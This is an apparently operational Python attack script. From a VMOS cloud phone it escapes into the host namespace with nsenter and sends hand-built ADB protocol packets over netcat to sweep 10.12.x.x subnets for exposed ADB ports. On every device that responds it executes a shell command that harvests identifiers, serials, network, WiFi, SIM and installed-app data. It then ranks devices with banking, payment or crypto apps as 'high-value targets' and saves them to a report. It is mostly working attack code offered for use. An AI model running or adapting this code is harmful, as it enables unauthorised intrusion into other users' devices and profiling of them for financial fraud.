#!/usr/bin/env python3
"""
Secondary device setup and extraction pipeline.
Target: APP5BJ4LRVRJFJQR (10.12.114.184/16)
"""

import asyncio
import struct
import base64
import json
import time
import re
from datetime import datetime
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

PAD = "APP5BJ4LRVRJFJQR"
AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
BASE = "https://api.vmoscloud.com"


def build_adb_packet(cmd, arg0, arg1, data=b""):
    CMD_MAP = {'CNXN': 0x4e584e43, 'OPEN': 0x4e45504f}
    ci = CMD_MAP[cmd]
    cs = sum(data) & 0xffffffff
    mg = ci ^ 0xffffffff
    hdr = struct.pack('<6I', ci, arg0, arg1, len(data), cs, mg)
    return hdr + data


# Comprehensive extraction command for each neighbor
EXTRACT_CMD = (
    "echo '===ID===';"
    "getprop ro.product.model;"
    "getprop ro.product.brand;"
    "getprop ro.product.manufacturer;"
    "getprop ro.build.fingerprint;"
    "getprop ro.serialno;"
    "getprop ro.build.version.release;"
    "getprop ro.build.version.sdk;"
    "getprop persist.sys.timezone;"
    "getprop ro.build.display.id;"
    "echo '===NET===';"
    "ip addr show 2>/dev/null|grep 'inet '|head -5;"
    "ip route show default 2>/dev/null|head -3;"
    "getprop net.gprs.local-ip;"
    "echo '===PROXY===';"
    "settings get global http_proxy 2>/dev/null;"
    "getprop http.proxyHost;"
    "getprop http.proxyPort;"
    "echo '===APPS===';"
    "pm list packages -3 2>/dev/null|head -80;"
    "echo '===VPN===';"
    "ls /data/misc/vpn/ 2>/dev/null;"
    "echo '===WIFI===';"
    "dumpsys wifi 2>/dev/null|grep 'SSID'|head -3;"
    "echo '===SIM===';"
    "getprop gsm.sim.operator.alpha;"
    "getprop gsm.operator.alpha;"
    "echo '===DONE==='"
)

# Shell script for mass scan + extract on device
SCAN_EXTRACT_SCRIPT = r'''#!/system/bin/sh
# scan_extract.sh - Runs entirely in host namespace
# Phase 1: Rapid ADB port scan
# Phase 2: Detailed extraction from responsive hosts

TMPDIR=/data/local/tmp
CNXN=$TMPDIR/cn.bin
OPEN_PROBE=$TMPDIR/op_probe.bin
OPEN_EXTRACT=$TMPDIR/op_extract.bin
SCAN_OUT=$TMPDIR/scan2_results.txt
EXTDIR=$TMPDIR/ext2
LOG=$TMPDIR/pipeline_log.txt
SUMMARY=$TMPDIR/pipeline_summary.txt
MAX_SCAN_PAR=20
MAX_EXT_PAR=6

mkdir -p "$EXTDIR"
echo "PIPELINE_START $(date +%s)" > "$LOG"

#------ Phase 1: Rapid ADB scan ------
echo "PHASE1_START $(date +%s)" >> "$LOG"
echo "" > "$SCAN_OUT"

scan_one() {
    _IP=$1
    # Quick CNXN-only probe (just send CNXN, check if we get CNXN back)
    RESP=$(timeout 3 nc "$_IP" 5555 < "$CNXN" 2>/dev/null | head -c 200 | strings 2>/dev/null)
    if [ -n "$RESP" ]; then
        # Extract device info from CNXN banner
        MODEL=$(echo "$RESP" | grep -o 'ro\.product\.model=[^;]*' | cut -d= -f2)
        BRAND=$(echo "$RESP" | grep -o 'ro\.product\.name=[^;]*' | cut -d= -f2)
        echo "ADB:$_IP|$MODEL|$BRAND" >> "$SCAN_OUT"
        echo "SCAN_OK $_IP $MODEL" >> "$LOG"
    fi
}

# Scan subnets visible in ARP + broader sweep
# Get our subnet
MY_IP=$(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
MY_NET=$(echo "$MY_IP" | cut -d. -f1-2)

echo "MY_IP=$MY_IP MY_NET=$MY_NET" >> "$LOG"

# Scan multiple subnets
for SUB3 in 1 2 6 11 26 56 61 75 81 90 93 99 105 108 111 112 114; do
    echo "SCANNING ${MY_NET}.${SUB3}.x $(date +%s)" >> "$LOG"
    RUNNING=0
    for HOST4 in $(seq 1 254); do
        IP="${MY_NET}.${SUB3}.${HOST4}"
        [ "$IP" = "$MY_IP" ] && continue
        scan_one "$IP" &
        RUNNING=$((RUNNING + 1))
        if [ "$RUNNING" -ge "$MAX_SCAN_PAR" ]; then
            wait
            RUNNING=0
        fi
    done
    wait
    echo "SUBNET_DONE ${MY_NET}.${SUB3}.x $(date +%s)" >> "$LOG"
done

SCAN_COUNT=$(grep -c '^ADB:' "$SCAN_OUT" 2>/dev/null)
echo "PHASE1_DONE total=$SCAN_COUNT $(date +%s)" >> "$LOG"

#------ Phase 2: Detailed extraction ------
echo "PHASE2_START $(date +%s)" >> "$LOG"

# Get unique IPs from scan
grep '^ADB:' "$SCAN_OUT" | cut -d'|' -f1 | sed 's/^ADB://' | sort -u > "$TMPDIR/ext2_ips.txt"
EXT_TOTAL=$(wc -l < "$TMPDIR/ext2_ips.txt")
echo "EXT_TOTAL=$EXT_TOTAL" >> "$LOG"

extract_one() {
    _IP=$1
    _TAG=$(echo "$_IP" | tr '.' '_')
    _RAW="$EXTDIR/${_TAG}.raw"
    _TXT="$EXTDIR/${_TAG}.txt"

    { cat "$CNXN"; sleep 0.3; cat "$OPEN_EXTRACT"; sleep 5; } | timeout 10 nc "$_IP" 5555 > "$_RAW" 2>/dev/null

    if [ -s "$_RAW" ]; then
        strings "$_RAW" > "$_TXT" 2>/dev/null
        echo "EXT_OK $_IP $(wc -c < $_RAW)" >> "$LOG"
    else
        echo "NO_RESPONSE" > "$_TXT"
        echo "EXT_FAIL $_IP" >> "$LOG"
    fi
    rm -f "$_RAW"
}

RUNNING=0
DONE=0
while read IP; do
    [ -z "$IP" ] && continue
    extract_one "$IP" &
    RUNNING=$((RUNNING + 1))
    DONE=$((DONE + 1))
    if [ "$RUNNING" -ge "$MAX_EXT_PAR" ]; then
        wait
        RUNNING=0
        echo "EXT_BATCH n=$DONE $(date +%s)" >> "$LOG"
    fi
done < "$TMPDIR/ext2_ips.txt"
wait

echo "PHASE2_DONE n=$DONE $(date +%s)" >> "$LOG"

#------ Phase 3: Build summary ------
echo "" > "$SUMMARY"
for f in "$EXTDIR"/*.txt; do
    _IP=$(basename "$f" .txt | tr '_' '.')
    if grep -q '===ID===' "$f" 2>/dev/null; then
        _MODEL=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '2p')
        _BRAND=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '3p')
        _MANUF=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '4p')
        _FP=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '6p')
        _SERIAL=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '7p')
        _ANDROID=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '8p')
        _SDK=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '9p')
        _TZ=$(sed -n '/===ID===/,/===NET===/p' "$f" | sed -n '10p')
        _PROXY=$(sed -n '/===PROXY===/,/===APPS===/p' "$f" | sed -n '2p')
        _PROXYH=$(sed -n '/===PROXY===/,/===APPS===/p' "$f" | sed -n '3p')
        _PROXYP=$(sed -n '/===PROXY===/,/===APPS===/p' "$f" | sed -n '4p')
        _NAPPS=$(grep -c '^package:' "$f" 2>/dev/null)
        _CARRIER=$(sed -n '/===SIM===/,/===DONE===/p' "$f" | sed -n '2p')
        echo "$_IP|$_MODEL|$_BRAND|$_MANUF|$_FP|$_SERIAL|$_ANDROID|$_SDK|$_TZ|$_PROXY|$_PROXYH|$_PROXYP|$_NAPPS|$_CARRIER" >> "$SUMMARY"
    else
        echo "$_IP|NO_RESPONSE|||||||||||||" >> "$SUMMARY"
    fi
done
echo "SUMMARY_DONE $(date +%s)" >> "$LOG"
echo "PIPELINE_COMPLETE" >> "$LOG"
'''


async def main():
    c = VMOSCloudClient(AK, SK, BASE)
    t0 = time.time()

    async def sh(cmd, t=30):
        await asyncio.sleep(3.5)
        r = await c.sync_cmd(pad_code=PAD, command=cmd, timeout_sec=t)
        d = r.get("data", {})
        if isinstance(d, list) and d:
            e = d[0]
            return (e.get("errorMsg", "") or "").strip() if isinstance(e, dict) else str(e)
        return str(d)

    async def nsh(cmd, t=30):
        e = cmd.replace("'", "'\\''")
        return await sh(f"nsenter -t 1 -m -u -i -n -p -- sh -c '{e}'", t)

    print("=" * 70)
    print("SECONDARY DEVICE EXTRACTION PIPELINE")
    print(f"Device: {PAD} | Subnet: 10.12.x.x/16")
    print("=" * 70)

    # ── Step 1: Enable ADB ─────────────────────────────────────────────
    print("\n[1] Enabling ADB on host...")
    await nsh("setprop service.adb.tcp.port 5555")
    await nsh("stop adbd 2>/dev/null; start adbd 2>/dev/null")
    await asyncio.sleep(4)
    adbd = await nsh("ps -A | grep adbd | grep -v grep | head -2")
    adb_port = await nsh("getprop service.adb.tcp.port")
    print(f"    ADB port: {adb_port}")
    print(f"    adbd: {adbd}")

    # ── Step 2: Build & push ADB packets ───────────────────────────────
    print("\n[2] Building and pushing ADB protocol packets...")

    # CNXN packet (same for all)
    cnxn = build_adb_packet('CNXN', 0x01000000, 256 * 1024, b"host::\x00")

    # Probe OPEN (just model)
    open_probe = build_adb_packet('OPEN', 1, 0, b"shell:getprop ro.product.model\x00")

    # Extract OPEN (full command)
    open_extract = build_adb_packet('OPEN', 1, 0, f"shell:{EXTRACT_CMD}\x00".encode())

    print(f"    CNXN: {len(cnxn)}B | Probe OPEN: {len(open_probe)}B | Extract OPEN: {len(open_extract)}B")

    # Push all three
    for name, pkt in [("cn.bin", cnxn), ("op_probe.bin", open_probe), ("op_extract.bin", open_extract)]:
        b64 = base64.b64encode(pkt).decode()
        if len(b64) > 3400:
            # Split
            mid = len(b64) // 2
            await nsh(f"echo -n '{b64[:mid]}' > /data/local/tmp/_b64a")
            await nsh(f"echo -n '{b64[mid:]}' > /data/local/tmp/_b64b")
            await nsh(f"cat /data/local/tmp/_b64a /data/local/tmp/_b64b | base64 -d > /data/local/tmp/{name}")
        else:
            await nsh(f"echo -n '{b64}' | base64 -d > /data/local/tmp/{name}")

    verify = await nsh("wc -c /data/local/tmp/cn.bin /data/local/tmp/op_probe.bin /data/local/tmp/op_extract.bin")
    print(f"    Sizes: {verify}")

    # ── Step 3: Quick ADB probe test ───────────────────────────────────
    print("\n[3] Testing ADB probe on known neighbors...")
    test_ips = ["10.12.81.32", "10.12.111.111", "10.12.114.61"]
    for tip in test_ips:
        probe = await nsh(
            f"{{ cat /data/local/tmp/cn.bin; sleep 0.3; cat /data/local/tmp/op_probe.bin; sleep 2; }} "
            f"| timeout 5 nc {tip} 5555 2>/dev/null | strings | grep -v host"
        )
        status = probe[:100].strip() if probe and probe.strip() else "NO RESPONSE"
        print(f"    {tip}: {status}")

    # ── Step 4: Push scan+extract script ───────────────────────────────
    print("\n[4] Pushing pipeline script to device...")
    script_b64 = base64.b64encode(SCAN_EXTRACT_SCRIPT.encode()).decode()
    chunk_size = 3400
    chunks = [script_b64[i:i + chunk_size] for i in range(0, len(script_b64), chunk_size)]
    print(f"    Script: {len(SCAN_EXTRACT_SCRIPT)} bytes, {len(chunks)} chunk(s)")

    # Write first chunk (overwrite)
    await nsh(f"echo -n '{chunks[0]}' > /data/local/tmp/_script_b64")
    for chunk in chunks[1:]:
        await nsh(f"echo -n '{chunk}' >> /data/local/tmp/_script_b64")

    await nsh("base64 -d < /data/local/tmp/_script_b64 > /data/local/tmp/scan_extract.sh")
    await nsh("chmod 755 /data/local/tmp/scan_extract.sh")

    verify = await nsh("wc -c < /data/local/tmp/scan_extract.sh; head -3 /data/local/tmp/scan_extract.sh")
    print(f"    Verified: {verify}")

    # ── Step 5: Clean and launch ───────────────────────────────────────
    print("\n[5] Launching pipeline in background...")
    await nsh("rm -rf /data/local/tmp/ext2 /data/local/tmp/pipeline_log.txt /data/local/tmp/pipeline_summary.txt /data/local/tmp/scan2_results.txt")
    await nsh("mkdir -p /data/local/tmp/ext2")

    # Launch with nohup
    await nsh("nohup sh /data/local/tmp/scan_extract.sh > /dev/null 2>&1 &")
    print("    Launched! Scanning 10.12.x.x subnets...")

    await asyncio.sleep(10)

    # ── Step 6: Poll progress ──────────────────────────────────────────
    print("\n[6] Polling progress (each subnet takes ~1-2min)...")

    for poll in range(200):
        await asyncio.sleep(25)

        log_tail = await nsh("tail -3 /data/local/tmp/pipeline_log.txt 2>/dev/null")
        scan_count = await nsh("grep -c '^ADB:' /data/local/tmp/scan2_results.txt 2>/dev/null")
        ext_ok = await nsh("grep -c '^EXT_OK' /data/local/tmp/pipeline_log.txt 2>/dev/null")
        ext_fail = await nsh("grep -c '^EXT_FAIL' /data/local/tmp/pipeline_log.txt 2>/dev/null")

        elapsed = int(time.time() - t0)
        phase = "SCAN" if "PHASE2" not in (log_tail or "") else "EXTRACT"
        if "PIPELINE_COMPLETE" in (log_tail or ""):
            phase = "DONE"

        print(f"    [{poll + 1}] {elapsed}s | Phase: {phase} | ADB found: {scan_count} | "
              f"Extracted: {ext_ok} | Failed: {ext_fail}")
        if log_tail:
            for ll in (log_tail or "").split("\n")[-2:]:
                if ll.strip():
                    print(f"         {ll.strip()}")

        if "PIPELINE_COMPLETE" in (log_tail or ""):
            print("\n    >>> PIPELINE COMPLETE!")
            break

    # ── Step 7: Read summary ───────────────────────────────────────────
    print("\n[7] Reading extraction summary...")
    summary_count = await nsh("wc -l < /data/local/tmp/pipeline_summary.txt 2>/dev/null")
    print(f"    Summary lines: {summary_count}")

    all_lines = []
    try:
        total = int((summary_count or "0").strip())
    except ValueError:
        total = 1000

    for start in range(1, max(total, 1) + 1, 50):
        end = start + 49
        chunk = await nsh(f"sed -n '{start},{end}p' /data/local/tmp/pipeline_summary.txt")
        if chunk and chunk.strip():
            all_lines.append(chunk)
        else:
            break

    summary_text = "\n".join(all_lines)

    # ── Step 8: Read scan results too ──────────────────────────────────
    print("\n[8] Reading scan results...")
    scan_text_parts = []
    scan_total_str = await nsh("wc -l < /data/local/tmp/scan2_results.txt 2>/dev/null")
    try:
        scan_total = int((scan_total_str or "0").strip())
    except ValueError:
        scan_total = 500
    for start in range(1, max(scan_total, 1) + 1, 60):
        end = start + 59
        chunk = await nsh(f"sed -n '{start},{end}p' /data/local/tmp/scan2_results.txt")
        if chunk and chunk.strip():
            scan_text_parts.append(chunk)
        else:
            break
    scan_text = "\n".join(scan_text_parts)

    # ── Step 9: Parse and classify ─────────────────────────────────────
    print("\n[9] Parsing and classifying devices...")

    devices = []
    for line in summary_text.split("\n"):
        line = line.strip()
        if not line:
            continue
        parts = line.split("|")
        if len(parts) >= 14:
            dev = {
                "ip": parts[0], "model": parts[1], "brand": parts[2],
                "manufacturer": parts[3], "fingerprint": parts[4],
                "serial": parts[5], "android": parts[6], "sdk": parts[7],
                "timezone": parts[8], "proxy": parts[9],
                "proxy_host": parts[10], "proxy_port": parts[11],
                "num_apps": parts[12], "carrier": parts[13],
            }
            devices.append(dev)
        elif len(parts) >= 2:
            devices.append({"ip": parts[0], "model": parts[1]})

    responsive = [d for d in devices if d.get("model") not in ("NO_RESPONSE", "", None)]
    no_resp = [d for d in devices if d.get("model") in ("NO_RESPONSE", "", None)]

    # Read app lists for responsive devices
    print(f"    Total: {len(devices)} | Responsive: {len(responsive)} | No response: {len(no_resp)}")

    FINANCIAL_APPS = {
        "com.google.android.apps.walletnfcrel": "Google Wallet",
        "com.paypal.android.p2pmobile": "PayPal",
        "com.venmo": "Venmo",
        "com.squareup.cash": "Cash App",
        "com.revolut.revolut": "Revolut",
        "com.wf.wellsfargomobile": "Wells Fargo",
        "com.chase.sig.android": "Chase",
        "com.infonow.bofa": "Bank of America",
        "com.citi.citimobile": "Citi Mobile",
        "com.usaa.mobile.android.usaa": "USAA",
        "com.americanexpress.android.acctsvcs.us": "Amex",
        "com.discoverfinancial.mobile": "Discover",
        "com.capitalone.mobile.banking": "Capital One",
        "com.binance.dev": "Binance",
        "com.coinbase.android": "Coinbase",
        "com.samsung.android.spay": "Samsung Pay",
        "com.amazon.mShop.android.shopping": "Amazon",
        "com.shopify.mobile": "Shopify",
        "com.afterpay.afterpay": "Afterpay",
        "com.klarna.android": "Klarna",
        "com.affirm.app": "Affirm",
        "com.zellepay.zelle": "Zelle",
        "com.robinhood.android": "Robinhood",
        "com.sofi.mobile": "SoFi",
        "com.stripe.android.paymentsheet": "Stripe",
        "com.transferwise.android": "Wise",
        "com.moneylion.maharaja": "MoneyLion",
    }

    high_value = []
    for dev in responsive:
        ip = dev["ip"]
        tag = ip.replace(".", "_")
        apps_raw = await nsh(f"grep '^package:' /data/local/tmp/ext2/{tag}.txt 2>/dev/null")
        if apps_raw:
            apps = [a.replace("package:", "").strip() for a in apps_raw.split("\n") if a.startswith("package:")]
            dev["apps"] = apps
            financial = [FINANCIAL_APPS[a] for a in apps if a in FINANCIAL_APPS]
            if financial:
                dev["financial_apps"] = financial
                dev["value_score"] = len(financial)
                high_value.append(dev)

    high_value.sort(key=lambda x: x.get("value_score", 0), reverse=True)

    # ── Step 10: Generate report ───────────────────────────────────────
    print("\n" + "=" * 70)
    print("NEIGHBOR EXTRACTION REPORT — 10.12.x.x SUBNET")
    print("=" * 70)

    print(f"\nTotal IPs with ADB: {len(devices)}")
    print(f"Extracted successfully: {len(responsive)}")
    print(f"No response: {len(no_resp)}")
    print(f"High-value targets: {len(high_value)}")
    print(f"Duration: {int(time.time() - t0)}s")

    # Proxy hosts
    print(f"\n{'─' * 70}")
    print("PROXY CONFIGURATIONS")
    print(f"{'─' * 70}")
    proxy_count = 0
    proxy_hosts = []
    for dev in responsive:
        p = dev.get("proxy", "")
        ph = dev.get("proxy_host", "")
        pp = dev.get("proxy_port", "")
        if (p and p not in ("null", "", ":0")) or (ph and ph != ""):
            proxy_count += 1
            print(f"  {dev['ip']:20s} {dev.get('model','?'):20s} "
                  f"Proxy: {p} | Host: {ph}:{pp}")
            proxy_hosts.append(dev)
    if proxy_count == 0:
        print("  No explicit proxy configs found via system settings.")

    # High-value
    print(f"\n{'─' * 70}")
    print("HIGH-VALUE TARGETS (Financial/Payment Apps)")
    print(f"{'─' * 70}")
    for i, dev in enumerate(high_value[:30], 1):
        print(f"\n  [{i}] {dev['ip']:20s} {dev.get('model','?'):20s} ({dev.get('brand','?')})")
        print(f"      Android {dev.get('android','?')} | SDK {dev.get('sdk','?')} | "
              f"TZ: {dev.get('timezone','?')}")
        print(f"      Serial: {dev.get('serial','?')} | Carrier: {dev.get('carrier','?')}")
        print(f"      Financial: {', '.join(dev.get('financial_apps', []))}")
        print(f"      Total apps: {len(dev.get('apps', []))}")

    # All responsive
    print(f"\n{'─' * 70}")
    print("ALL RESPONSIVE DEVICES")
    print(f"{'─' * 70}")
    print(f"  {'IP':20s} {'Model':20s} {'Brand':12s} {'Android':8s} {'Apps':5s} {'Carrier':15s}")
    print(f"  {'─' * 20} {'─' * 20} {'─' * 12} {'─' * 8} {'─' * 5} {'─' * 15}")
    for dev in responsive:
        print(f"  {dev['ip']:20s} {dev.get('model', '?')[:20]:20s} "
              f"{dev.get('brand', '?')[:12]:12s} {dev.get('android', '?'):8s} "
              f"{dev.get('num_apps', '?'):5s} {dev.get('carrier', '?')[:15]:15s}")

    # Save JSON
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "source_device": PAD,
        "source_ip": "10.12.114.184",
        "subnet": "10.12.0.0/16",
        "stats": {
            "total_adb": len(devices),
            "responsive": len(responsive),
            "no_response": len(no_resp),
            "high_value": len(high_value),
            "proxy_configured": proxy_count,
            "duration_sec": int(time.time() - t0),
        },
        "high_value_targets": high_value[:50],
        "proxy_hosts": proxy_hosts,
        "all_devices": devices,
        "scan_results_raw": scan_text,
    }
    with open("neighbor_report_10_12.json", "w") as f:
        json.dump(report, f, indent=2, default=str)

    with open("neighbor_report_10_12.txt", "w") as f:
        f.write(f"NEIGHBOR EXTRACTION REPORT — {datetime.utcnow().isoformat()}\n")
        f.write(f"Source: {PAD} @ 10.12.114.184/16\n")
        f.write(f"{'=' * 70}\n\n")
        f.write(f"Total ADB: {len(devices)} | Responsive: {len(responsive)} | "
                f"High-value: {len(high_value)} | Proxied: {proxy_count}\n\n")
        f.write("HIGH-VALUE TARGETS:\n")
        for i, dev in enumerate(high_value, 1):
            f.write(f"  [{i}] {dev['ip']} {dev.get('model','?')} ({dev.get('brand','?')}) "
                    f"Android {dev.get('android','?')} "
                    f"Financial: {', '.join(dev.get('financial_apps', []))}\n")
        f.write(f"\nALL RESPONSIVE ({len(responsive)}):\n")
        for d in responsive:
            f.write(f"  {d['ip']:20s} {d.get('model','?'):20s} {d.get('brand','?'):12s} "
                    f"Android {d.get('android','?')} Apps:{d.get('num_apps','?')}\n")
        f.write(f"\nPROXY HOSTS ({proxy_count}):\n")
        for d in proxy_hosts:
            f.write(f"  {d['ip']} proxy={d.get('proxy','')} host={d.get('proxy_host','')}:{d.get('proxy_port','')}\n")

    print(f"\n{'=' * 70}")
    print(f"Reports saved: neighbor_report_10_12.json / .txt")
    print(f"{'=' * 70}")

    # ── Also try S25 recovery ──────────────────────────────────────────
    print("\n[BONUS] Checking if S25 is back...")
    try:
        await asyncio.sleep(3.5)
        r = await c.sync_cmd(pad_code="ATP6416I3JJRXL3V", command="echo alive", timeout_sec=30)
        if r.get("code") == 200:
            d = r.get("data", [])
            if isinstance(d, list) and d:
                msg = d[0].get("errorMsg", "") if isinstance(d[0], dict) else str(d[0])
                print(f"    S25 status: {msg}")
                if "alive" in (msg or ""):
                    print("    S25 is BACK! Can recover 632 scan entries from it.")
        else:
            print(f"    S25 still busy: {r.get('code')}")
    except Exception as ex:
        print(f"    S25 error: {ex}")


if __name__ == "__main__":
    asyncio.run(main())
